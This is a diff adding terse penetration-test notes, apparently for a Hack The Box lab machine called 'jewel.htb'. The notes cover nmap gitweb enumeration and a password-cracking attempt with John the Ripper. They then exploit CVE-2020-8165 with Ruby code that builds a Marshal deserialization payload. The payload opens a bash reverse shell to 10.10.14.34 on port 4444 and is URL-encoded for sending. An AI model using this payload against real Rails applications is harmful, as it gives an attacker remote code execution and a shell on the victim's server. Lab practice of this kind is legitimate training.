@@ -1,0 +1,23 @@
+10.129.46.112
+ls -la /usr/share/nmap/scripts | grep "git"
+nmap --script  http-gitweb-projects-enum.nse jewel.htb -p 8000 -Pn
+found pass in gitweb  content  use grep search
+###not work
+john hash.txt -w=/home/qoo7972365/Desktop/rockyou.txt
+found  use rails frame in gitweb  then search rails version CVE then found  CVE-2020-8165
+search CVE-2020-8165 in github and fellow
+git clone https://github.com/masahiro331/CVE-2020-8165.git
+###modify Getfile before bundle
+bundle install --path vendor/bundle
+bundle exec rails db:migrate
+bundle exec rails console
+
+code = '`/bin/bash -c  "bash -i  >& /dev/tcp/10.10.14.34/4444 0>&1"`'
+erb = ERB.allocate
+erb.instance_variable_set :@src, code
+erb.instance_variable_set :@filename, "1"
+erb.instance_variable_set :@lineno, 1
+payload = Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
+puts "Payload"
+require 'uri'
+puts URI.encode_www_form(payload: payload)
